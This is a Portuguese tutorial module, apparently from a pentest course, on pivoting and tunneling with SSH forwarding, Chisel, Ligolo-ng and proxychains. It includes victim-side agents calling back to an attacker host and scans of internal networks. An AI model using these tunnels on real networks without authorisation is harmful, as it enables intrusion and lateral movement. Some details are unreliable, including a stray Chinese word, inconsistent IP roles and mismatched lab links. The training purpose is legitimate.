# Pivoting e Tunneling

> Manter acesso e movimentar-se pela rede após exploração inicial.

---

## 📚 O que é Pivoting e Tunneling?

**Pivoting** é usar uma máquina comprometida como ponte para acessar outras redes que não são diretamente alcançáveis. **Tunneling** é encapsular tráfego dentro de outro protocolo para atravessar firewalls e segmentos de rede.

### Por que isso é importante?

- A rede interna geralmente **não é acessível diretamente** da internet
- Firewalls separam DMZ da rede corporativa
- Permite **movimentação lateral** em ambientes segmentados
- Essencial para atingir **objetivos de alto valor** (controladores de domínio, bancos)

### Como funciona na prática?

```
SUA MÁQUINA → [SSH Tunnel] → SERVIDOR COMPROMETIDO (DMZ) → [Proxy] → REDE INTERNA
              192.168.1.10     172.16.1.5                        10.0.0.0/24
```

### Ferramentas

| Ferramenta | Tipo | Uso |
|:---|:---|:---|
| **SSH** | Tunneling nativo | Local/Remote/Dynamic port forwarding |
| **Chisel** | Tunneling HTTP | Quando SSH está bloqueado |
| **Ligolo-ng** | Tunneling moderno | Sem necessidade de SOCKS |
| **Proxychains** | Wrapper | Forçar apps a usar o túnel |

---

## O que é Pivoting

Pivoting é usar uma máquina comprometida como ponto de acesso para alcançar outras redes ou máquinas que não estão diretamente acessíveis.

**Exemplo real:** Você comprometeu um servidor web na DMZ. Atrás dele existe uma rede interna (10.0.0.0/24) que você não consegue acessar diretamente. Usando pivoting, você cria um túnel através do servidor web para alcançar essa rede interna.

## Quando usar Pivoting

- Máquina comprometida está em uma rede diferente do alvo
- Firewalls bloqueiam acesso direto à rede interna
- Precisa acessar serviços internos (SMB, RDP, SSH)
- Movimentação lateral em ambientes corporativos

## Fluxo típico

```
1. Comprometer máquina inicial (entry point)
        ↓
2. Coletar informações da rede (ip a, route, arp)
        ↓
3. Configurar túnel até a rede interna
        ↓
4. Usar proxychains para acessar serviços internos
        ↓
5. Explorar máquinas na rede interna
```

---

## Instalação das Ferramentas

```bash
# Chisel (tunneling via HTTP)
go install github.com/jpillora/chisel@latest

# Ligolo-ng (tunneling sem SOCKS)
# Download: https://github.com/nicocha30/ligolo-ng/releases

# proxychains4 (forçar apps a usar proxy)
sudo apt install -y proxychains4
```

---

## SSH Tunneling

A forma mais simples de pivoting - usa SSH que já existe no sistema.

### Local Port Forwarding
```bash
# Redirecionar porta local para um serviço remoto
ssh -L 8080:10.0.0.5:80 user@192.168.1.100

# Agora acesse http://localhost:8080 → chega em 10.0.0.5:80
```

**Quando usar:** Precisa acessar um serviço interno a partir da sua máquina.

### Remote Port Forwarding
```bash
# Criar porta no servidor remoto que redireciona para sua máquina
ssh -R 9090:localhost:8080 user@192.168.1.100

# Agora quem acessar 192.168.1.100:9090 chega em seu localhost:8080
```

**Quando usar:** Precisa expor um serviço da sua máquina para a rede do alvo.

### Dynamic Port Forwarding (SOCKS Proxy)
```bash
# Criar proxy SOCKS que redireciona tudo através do túnel
ssh -D 1080 user@192.168.1.100

# Configurar proxychains para usar:
# socks5 127.0.0.1 1080

# Agora qualquer ferramenta pode acessar a rede interna:
proxychains4 nmap -sV -Pn 10.0.0.0/24
proxychains4 curl http://10.0.0.5
```

**Quando usar:** Precisa acessar múltiplos serviços na rede interna.

### Exemplo completo
```bash
# 1. Conectar na máquina comprometida
ssh user@192.168.1.100

# 2. Na máquina comprometida, descobrir redes
ip a
#eth0: 192.168.1.100/24
#eth1: 10.0.0.5/24  ← rede interna

# 3. Na sua máquina, criar túnel
ssh -D 1080 user@192.168.1.100

# 4. Configurar proxychains
echo "socks5 127.0.0.1 1080" >> /etc/proxychains4.conf

# 5. Acessar rede interna
proxychains4 nmap -sV -Pn 10.0.0.0/24
```

---

## Chisel

Tunneling via HTTP/HTTPS. Útil quando SSH está bloqueado.

### 🎯 Quando usar o Chisel
- SSH está bloqueado ou filtrado por firewall entre sua máquina e o target
- Precisa criar um túnel SOCKS rápido para escanear e acessar uma rede interna
- A vítima tem acesso à internet mas não permite conexões SSH de fora
- Precisa de port forwarding específico (ex: redirecionar RDP ou SMB de uma rede interna)

### 🛠️ Como o Chisel te ajuda
- Encapsula tráfego TCP/UDP dentro de HTTP/HTTPS, atravessando firewalls que bloqueiam SSH
- Cria um proxy SOCKS que qualquer ferramenta pode usar (nmap, hydra, smbclient)
- Permite múltiplos túneis simultâneos em uma única conexão
- Funciona em Windows e Linux — basta baixar o binário para a vítima

### ➡️ Depois de usar o Chisel — Próximos passos
1. Configure o proxychains para apontar para o SOCKS local (geralmente `socks5 127.0.0.1 1080`)
2. Teste o túnel com `proxychains4 curl http://rede-interna` antes de escanear
3. Execute enumeração completa da rede interna via proxychains (nmap, enum4linux-ng)
4. Se precisar de port forwarding específico, crie túneis dedicados para cada serviço (RDP, SMB)

### Instalação
```bash
# No atacante (.listener):
go install github.com/jpillora/chisel@latest

# Na vítima (client) - baixar binário:
# https://github.com/jpillora/chisel/releases
```

### Uso básico

#### Atacante (Servidor)
```bash
# Iniciar servidor SOCKS na porta 8080
chisel server --reverse --port 8080

# Output:
# 2024/01/01 10:00:00 server: Listening on :8080
```

#### Vítima (Cliente)
```bash
# Conectar no servidor e criar proxy SOCKS
chisel client 192.168.1.100:8080 127.0.0.1:1080:socks

# Agora configure proxychains:
# socks5 127.0.0.1 1080
```

### Exemplo avançado
```bash
# Port forwarding específico
chisel client 192.168.1.100:8080 R:3389:10.0.0.5:3389
# Agora localhost:3389 → 10.0.0.5:3389 (RDP)

# Múltiplos túneis
chisel client 192.168.1.100:8080 R:3389:10.0.0.5:3389 R:445:10.0.0.5:445
```

---

## Ligolo-ng

Tunneling moderno sem necessidade de SOCKS — mais rápido que Chisel.

### 🎯 Quando usar o Ligolo-ng
- Precisa de pivoting para redes internas sem a sobrecarga de configurar SOCKS
- Quer uma alternativa mais rápida e moderna ao Chisel para movimentação lateral
- A vítima é Windows e você quer evitar configurar proxychains no sistema
- Precisa de múltiplos túneis simultâneos com interface de gerenciamento interativa

### 🛠️ Como o Ligolo-ng te ajuda
- Cria rotas diretamente na interface de rede — não precisa configurar proxychains
- Interface interativa permite gerenciar sessões e adicionar rotas em tempo real
- Mais rápido que Chisel por não ter overhead de SOCKS
- Suporta conexões reversas — a vítima inicia a conexão, útil quando atrás de NAT

### ➡️ Depois de usar o Ligolo-ng — Próximos passos
1. Verifique as interfaces da vítima com `ifconfig` no proxy para identificar redes acessíveis
2. Adicione rotas para todas as redes internas descobertas antes de escanear
3. Teste conectividade com ping ou curl para as redes internas
4. Execute enumeração (nmap, enum4linux-ng) diretamente — sem precisar de proxychains

### Instalação

```bash
# Download do proxy (ativo) e agent (vítima)
# https://github.com/nicocha30/ligolo-ng/releases

# No Kali (ativo):
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.1/ligolo-ng_proxy_0.7.1_linux_amd64.tar.gz
tar xzf ligolo-ng_proxy_*.tar.gz

# Na vítima (Windows/Linux):
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.7.1/ligolo-ng_agent_0.7.1_linux_amd64.tar.gz
```

### Configuração — Atacante (Proxy)

```bash
# 1. Criar interface tun
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# 2. Iniciar proxy com certificado self-signed
sudo ./proxy -selfcert -laddr 0.0.0.0:11601

# OUTPUT ESPERADO:
# INFO[0000] Starting proxy server... addr=0.0.0.0:11601
# INFO[0000] Listening for connections...
```

### Configuração — Vítima (Agent)

```bash
# 1. Conectar no proxy do atacante
./agent -connect 192.168.1.100:11601 -ignore-cert

# OUTPUT ESPERADO:
# INFO[0000] Connecting to proxy 192.168.1.100:11601...
# INFO[0001] Connected! Waiting for instructions...
```

### Configuração de roteamento (no Proxy interativo)

```bash
# No terminal do proxy, listar sessões ativas
>> session

# Selecionar sessão da vítima
>> 1

# Ver interfaces da vítima
>> ifconfig

# OUTPUT ESPERADO:
# Name      IP             MAC
# eth0      10.0.0.5       aa:bb:cc:dd:ee:ff  ← rede interna
# eth1      192.168.1.50   11:22:33:44:55:66  ← rede externa

# Adicionar rota para rede interna
>> sudo ip route add 10.0.0.0/24 dev ligolo

# Agora pode acessar 10.0.0.0/24 diretamente!
nmap -sV 10.0.0.0/24
# OUTPUT ESPERADO:
# Nmap scan report for 10.0.0.5
# PORT     STATE SERVICE VERSION
# 22/tcp   open  ssh     OpenSSH 8.9
# 80/tcp   open  http    Apache httpd 2.4.54
# 445/tcp  open  smb     Samba 4.17
```

---

## Proxychains

Força qualquer aplicação a usar o túnel SOCKS.

### 🎯 Quando usar o Proxychains
- Você já tem um túnel SOCKS ativo (via SSH, Chisel ou Ligolo-ng) e precisa forçar ferramentas a usá-lo
- Ferramentas como nmap, hydra e smbclient não suportam proxy SOCKS nativamente
- Precisa fazer enumeração de rede interna através de um túnel já configurado
- Quer que todo o tráfego de um comando passe pelo túnel sem modificar a ferramenta

### 🛠️ Como o Proxychains te ajuda
- Intercepts chamadas de rede de qualquer aplicação e redireciona pelo proxy SOCKS
- Funciona com nmap, curl, ssh, hydra, smbclient — praticamente qualquer ferramenta de rede
- Modo `dynamic_chain` permite múltiplos proxies em sequência para redundância
- Não precisa modificar as ferramentas — basta adicionar `proxychains4` antes do comando

### ➡️ Depois de usar o Proxychains — Próximos passos
1. Verifique se o arquivo `/etc/proxychains4.conf` aponta para o proxy SOCKS correto
2. Teste o túnel com um comando simples antes de escanear: `proxychains4 curl http://target`
3. Se o nmap não funcionar, desabilite a resolução DNS no proxychains config
4. Documente quais serviços da rede interna foram descobertos através do túnel

### Configuração
```bash
# Editar /etc/proxychains4.conf
# Trocar para:
dynamic_chain
proxy_list
socks5 127.0.0.1 1080
```

### Uso
```bash
# Nmap via proxychains
proxychains4 nmap -sV -Pn 10.0.0.0/24

# Curl via proxychains
proxychains4 curl http://10.0.0.5

# SSH via proxychains
proxychains4 ssh user@10.0.0.5

# RDP via proxychains
proxychains4 xfreerdp /v:10.0.0.5 /u:admin
```

---

## Erros Comuns

1. **Esquecer de adicionar rota** — sem rota, o tráfego não vai para a rede interna
2. **Não verificar redes** — sempre rode `ip a` e `route -n` na máquina comprometida
3. **Usar T4 com proxychains** — é muito lento, use T2
4. **Não testar conectividade** — sempre teste com `ping` ou `curl` antes de escanear

---

### Resumo da ordem — Por que essa sequência?

Pivoting segue: **descobrir → conectar → tunelar → explorar**.

```
PASSO 1: Enumerar rede → Descobrir quais redes existem
├── POR QUE: Não pode tunelar se não sabe o destino
├── O QUE FAZER: ip a, route -n, arp -a na máquina comprometida
├── O QUE PROCURAR: Interfaces com IPs diferentes (ex: 10.0.0.0/24)
├── QUANDO AVANÇAR: Quando souber quais redes alcançar
└── SE DER ERRADO: Se não tiver acesso, use nmap -sn para escanear

        ↓

PASSO 2: Configurar túnel → Criar caminho até a rede interna
├── POR QUE: Rede interna não é acessível diretamente
├── OPÇÕES: SSH tunnel (simples), Chisel (avançado), Ligolo-ng (moderno)
├── COMANDO SSH: ssh -D 1080 user@comprometida
├── QUANDO AVANÇAR: Quando o túnel estiver ativo
└── DICAS: Teste com: curl --socks5 127.0.0.1:1080 http://interno

        ↓

PASSO 3: Proxychains → Forçar todo trafego pelo túnel
├── POR QUE: Ferramentas como nmap não usam túnel por padrão
├── O QUE FAZER: Editar /etc/proxychains4.conf, adicionar proxy SOCKS
├── COMANDO: proxychains4 nmap -sV 10.0.0.0/24
├── QUANDO AVANÇAR: Quando conseguir ver services da rede interna
└── ERROS COMUNS: Não esqueça de: proxychains4 antes de cada comando

        ↓

PASSO 4: Explorar serviços internos → Acessar máquinas alvo
├── POR QUE: Objetivo final é alcançar其他 máquinas
├── FERRAMENTAS: proxychains + hydra, smbclient, evil-winrm
├── QUANDO PARAR: Quando tiver acesso à máquina alvo
└── DICAS: Salve logs de cada acesso para documentação
```

---

## Lab Prático

### Exercício 1: Pivot básico com SSH
- **Plataforma:** TryHackMe
- **Link:** https://tryhackme.com/room/dvwa
- **O que vai praticar:** SSH tunneling, proxychains, nmap via túnel
- **Tempo estimado:** 30 min

### Exercício 2: Pivoting com Chisel
- **Plataforma:** HackTheBox
- **Link:** https://app.hackthebox.com/rooms/ignite
- **O que vai praticar:** Chisel, port forwarding, acesso a rede interna
- **Tempo estimado:** 45 min

### Dica de Estudo
> Pratique em máquinas fáceis do TryHackMe primeiro. Tente acessar serviços internos usando apenas SSH tunneling antes de usar Chisel ou Ligolo-ng.

---

**Anterior:** [Módulo 4: Exploração](../04-exploracao/)
**Próximo:** [Módulo 6: Engenharia Reversa](../06-reversing/)
